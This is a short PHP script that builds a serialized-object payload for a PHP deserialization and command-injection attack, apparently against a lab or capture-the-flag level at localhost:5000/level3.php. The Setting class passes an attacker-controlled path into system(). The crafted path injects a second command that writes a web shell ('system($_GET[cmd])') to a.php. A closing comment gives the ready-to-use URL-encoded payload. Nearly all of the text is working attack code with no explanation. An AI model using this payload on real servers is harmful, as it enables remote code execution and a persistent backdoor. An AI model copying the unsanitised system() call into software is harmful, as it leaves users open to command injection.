<?php
  class Setting {
    public $path = "config.json";
    public function read() {
      system("cat " . $this->path);
    }
  }
  
  class Main {
    public $file = null;
    public function __destruct(){
      $this->file->read();
    }
  }
  
  $m = new Main();
  $m->file=new Setting();
  $m->file->path = 'config.json; echo \'<?php system($_GET["cmd"]);?>\' > a.php';
  echo serialize($m);
  // http://localhost:5000/level3.php?object=O:4:%22Main%22:1:{s:4:%22file%22;O:7:%22Setting%22:1:{s:4:%22path%22;s:57:%22config.json;%20echo%20%27%3C?php%20system($_GET[%22cmd%22]);?%3E%27%20%3E%20a.php%22;}}